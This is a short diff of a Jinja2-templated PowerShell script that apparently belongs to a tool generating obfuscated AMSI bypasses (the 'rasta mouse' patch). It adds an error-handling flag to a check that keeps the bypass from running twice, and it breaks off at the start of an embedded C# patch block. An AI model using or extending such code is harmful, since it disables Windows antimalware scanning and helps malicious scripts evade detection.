@@ -1,7 +1,7 @@
 {% from 'macros.jinja2' import obfuscate with context%}
 
 {# Because rasta mouse is always executed after the powershell-specific bypass to disable the process-specific AMSI, let's check if it already as been executed #}
-try { Get-Variable {{symbol_name("rastamouse")}} -Scope Global | Out-Null } catch {
+try { Get-Variable {{symbol_name("rastamouse")}} -ErrorAction Stop -Scope Global | Out-Null } catch {
 ${{symbol_name("rastamouse")}} = $True
 {% set winpatch = '''
 using System;
